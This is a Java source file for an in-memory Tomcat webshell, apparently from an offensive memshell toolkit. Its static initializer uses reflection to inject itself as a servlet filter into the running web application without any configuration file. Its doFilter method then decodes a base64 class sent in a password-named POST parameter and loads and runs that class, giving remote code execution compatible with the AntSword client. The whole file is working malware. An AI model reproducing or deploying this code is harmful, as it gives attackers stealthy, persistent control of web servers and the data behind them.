package org.erosion2020.memshell;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class AntSwordFilter  implements Filter {

    static Map<String, Class<?>> loaded = new ConcurrentHashMap<>();

    public static String name;
    public static String pattern;
    public static String password;
    static {
        try {
            final String urlPattern = pattern;

            WebappClassLoaderBase loader =
                    (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext context = (StandardContext) loader.getResources().getContext();

            Field filterConfigsField = findField(context.getClass(), "filterConfigs");
            filterConfigsField.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<String, ApplicationFilterConfig> filterConfigs =
                    (Map<String, ApplicationFilterConfig>) filterConfigsField.get(context);

            // 创建 Filter 对象和 FilterDef
            AntSwordFilter filter = new AntSwordFilter();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            context.addFilterDef(filterDef);

            // 添加 Filter 映射
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(urlPattern);
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            context.addFilterMapBefore(filterMap);

            // 构造 ApplicationFilterConfig 对象并注册
            Constructor<ApplicationFilterConfig> constructor =
                    ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig config = constructor.newInstance(context, filterDef);
            filterConfigs.put(name, config);

        } catch (Exception ignore) { }
    }
    private static Field findField(Class<?> clazz, String name) throws NoSuchFieldException {
        while (clazz != null) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException("Field " + name + " not found.");
    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        Filter.super.init(filterConfig);
    }

    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        if ("POST".equalsIgnoreCase(request.getMethod())) {
            try {
                String cls = request.getParameter(password);
                if (cls != null) {
                    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
                }
            } catch (Exception e) { e.printStackTrace(); }
        }
        filterChain.doFilter(request, response);
    }

    public byte[] base64Decode(String str) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64=Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception e) {
            try {
                base64=Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
            } catch (Exception ee) {}
        }
        return value;
    }

    @Override
    public void destroy() {
        Filter.super.destroy();
    }
}
